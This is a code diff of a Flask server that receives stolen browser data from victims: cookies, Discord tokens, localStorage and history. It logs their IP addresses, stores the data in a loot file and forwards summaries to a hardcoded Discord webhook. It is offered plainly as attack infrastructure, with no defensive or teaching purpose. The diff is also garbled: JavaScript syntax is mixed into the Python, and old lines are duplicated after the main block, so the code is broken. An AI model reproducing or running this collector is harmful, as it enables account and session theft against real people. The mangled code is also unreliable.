@@ -1,40 +1,80 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request, send_file
+from flask_cors import CORS
 import json
-import os
 import requests
 from datetime import datetime
+import base64
 import logging
+import os
 
 app = Flask(__name__)
+CORS(app)  # Fix CORS
 
-# YOUR WEBHOOK (already configured)
+# YOUR WEBHOOK
 WEBHOOK_URL = "https://discord.com/api/webhooks/1475299568844537978/sY0Q1M8QTyU2Pwung5uuIb5Dn3nvqhuD3tnmEvyGf48ZkFmQfiy-MSBIJCs5k8LQDYER"
-CREDS_FILE = 'browser_loot.json'
+LOOT_FILE = 'full_loot.json'
 
-logging.basicConfig(level=logging.INFO)
-logger = logging.getLogger(__name__)
-
-def get_ip_info(ip):
-    try:
-        response = requests.get(f"https://ipapi.co/{ip}/json/", timeout=3)
-        data = response.json()
-        return f"{data.get('city', 'N/A')}, {data.get('country_name', 'N/A')}"
-    except:
-        return "Unknown"
-
-def send_to_webhook(loot):
-    """Enhanced webhook with full browser loot"""
+def send_webhook(loot):
+    ip = loot.get('ip', request.remote_addr)
+    
     embed = {
-        "title": "🕷️ FULL BROWSER LOOT CAPTURED",
-        "description": f"**Victim IP:** `{loot['ip']}`\n**Location:** {loot['location']}",
-        "color": 0xff6b6b,
+        "title": "🕷️ AUTO-LOOT DELIVERED",
+        "color": 16711680,
         "fields": [
-            {"name": "🍪 Cookies", "value": f"`{len(loot.get('cookies', ''))}` chars", "inline": True},
-            {"name": "🔑 Passwords", "value": f"`{len(loot.get('passwords', []))}` found", "inline": True},
-            {"name": "💎 Discord Tokens", "value": f"`{Object.keys(loot.get('discordTokens', {})).length}` extracted", "inline": True},
-            {"name": "📱 LocalStorage", "value": f"`{Object.keys(loot.get('localStorage', {})).length}` items", "inline": True}
+            {"name": "🌐 IP", "value": f"`{ip}`", "inline": true},
+            {"name": "🍪 Cookies", "value": f"`{len(loot.get('cookies', ''))}` chars", "inline": true},
+            {"name": "💎 Tokens", "value": f"`{Object.keys(loot.get('discordTokens', {})).length}`", "inline": true},
+            {"name": "📦 Storage", "value": f"`{Object.keys(loot.get('localStorage', {})).length}` keys", "inline": true},
+            {"name": "📜 History", "value": f"`{loot.get('history', []).length}` Discord pages", "inline": true}
         ],
-        "footer": {"text": f"{loot['timestamp'][:19]} | UA: {loot['user_agent'][:40]}..."},
+        "footer": {"text": loot['timestamp'][:19]},
+        "thumbnail": {"url": "https://discord.com/assets/f9c9114725d6e2712627b838ad26a9c9.svg"}
+    }
+    
+    requests.post(WEBHOOK_URL, json={"username": "AutoLoot", "embeds": [embed]})
+
+@app.route('/', methods=['GET', 'POST'])
+def index():
+    return send_file('index.html')
+
+@app.route('/harvest', methods=['POST'])
+def harvest():
+    loot = request.get_json() or {}
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    loot['ip'] = ip
+    
+    # Send webhook
+    send_webhook(loot)
+    
+    # Save raw
+    loot_list = []
+    if os.path.exists(LOOT_FILE):
+        with open(LOOT_FILE, 'r') as f:
+            loot_list = json.load(f)
+    loot_list.append(loot)
+    with open(LOOT_FILE, 'w') as f:
+        json.dump(loot_list, f, indent=2)
+    
+    return "OK", 200
+
+@app.route('/harvest')
+def harvest_get():
+    data = request.args.get('data')
+    if data:
+        loot = json.loads(base64.b64decode(data).decode())
+        send_webhook(loot)
+    return "OK", 200
+
+# Static serving
+@app.route('/<path:path>')
+def static_files(path):
+    try:
+        return send_file(path)
+    except:
+        return send_file('index.html')
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000, debug=True)        "footer": {"text": f"{loot['timestamp'][:19]} | UA: {loot['user_agent'][:40]}..."},
         "thumbnail": {"url": "https://discord.com/assets/f9c9114725d6e2712627b838ad26a9c9.svg"}
     }
     
